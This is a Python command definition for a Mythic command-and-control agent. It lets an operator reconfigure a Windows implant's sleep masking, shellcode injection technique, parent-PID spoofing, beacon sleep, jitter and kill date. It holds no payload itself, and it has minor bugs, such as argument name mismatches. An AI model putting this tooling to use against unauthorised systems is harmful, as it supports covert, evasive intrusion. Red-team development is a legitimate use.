from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import datetime

class ConfigArguments( TaskArguments ):
    def __init__( self, command_line, **kwargs ):
        super().__init__( command_line, **kwargs )
        self.args = [
            CommandParameter(
                name        = "action",
                type        = ParameterType.ChooseOne,
                description = "The configuration option to modify",
                choices     = ["mask", "ppid", "injection-sc", "sleep", "jitter", "killdate"],
                parameter_group_info = [
                    ParameterGroupInfo(
                        required   = True,
                        group_name = "Default"
                    )
                ]
            ),
            CommandParameter(
                name        = "value",
                type        = ParameterType.String,
                description = "The value to set for the option",
                parameter_group_info = [
                        ParameterGroupInfo (
                        required   = True,
                        group_name = "Default"
                    )
                ]
            )
        ]

    async def parse_arguments(self):
        if len( self.command_line ) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string( self.command_line )
            else:
                parts = self.command_line.split(" ", 1)
                if len(parts) == 2:
                    self.add_arg( "option", parts[0].strip("-") )
                    self.add_arg( "value", parts[1] )
                else:
                    raise ValueError( "Invalid arguments. Usage: config -option value" );
        else:
            raise ValueError( "Must supply arguments" );

class ConfigCommand( CommandBase ):
    cmd         = "config"
    needs_admin = False
    help_cmd    = \
    """
    config {-option} [value]

    Actions: 
    -mask         [timer|apc|none]  - Change the sleep mask technique
    -injection-sc [classic|stomp]   - Change the technique used to injection shellcode
    -sleep        [seconds]         - Change sleep time
    -jitter       [percentage]      - Change jitter
    -killdate     [YYYY-MM-DD]      - Change kill date

    Examples:
    config -mask timer
    config -injection-sc stomp
    config -sleep 5 -jitter 10
    config -killdate 2040-01-01
    """
    description = "Configure agent settings"
    version     = 2
    author      = "@ Oblivion"
    attackmapping  = ["T1059", "T1059.001", "T1059.003"]
    argument_class = ConfigArguments
    attributes     = CommandAttributes(
        supported_os      = [SupportedOS.Windows],
        suggested_command = True,
        load_only         = False,
        builtin           = True
    );

    async def create_go_tasking( self, task: PTTaskMessageAllData ) -> PTTaskCreateTaskingMessageResponse:
        option = task.args.get_arg( "option" );
        value  = task.args.get_arg( "value" );
    
        if option == "mask":
            if value.lower() not in ["timer", "apc", "none"]:
                raise ValueError( "Invalid mask value. Must be timer, apc, or none" );
        elif option == "injection-sc":
            if value.lower() not in ["classic", "stomp"]:
                raise ValueError( "Invalid injection-sc value. Must be classic or stomp" );
        elif option == "sleep":
            try:
                sleep = int( value )
                if sleep < 0:
                    raise ValueError( "Sleep value must be positive" );
            except ValueError:
                raise ValueError( "Sleep value must be an integer" );
        elif option == "jitter":
            try:
                jitter = int( value );
                if not 0 <= jitter <= 100:
                    raise ValueError( "Jitter must be between 0 and 100" );
            except ValueError:
                raise ValueError( "Jitter value must be an integer" );
        elif option == "ppid":
            
            ppid = int( value );
        elif option == "killdate":
            try:
                datetime.datetime.strptime(value, "%Y-%m-%d");
            except ValueError:
                raise ValueError( "Killdate must be in YYYY-MM-DD format" );
        
        response = PTTaskCreateTaskingMessageResponse(
            TaskID        = task.Task.ID,
            Success       = True,
            Completed     = True,
            DisplayParams = f"{option} {value}"
        )
        
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(
            TaskID  = task.Task.ID,
            Success = True
        )
        
        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
            TaskID   = task.Task.ID,
            Response = f"Successfully updated { task.args.get_arg('option') } to { task.args.get_arg('value') }".encode()
        ))
        
        return resp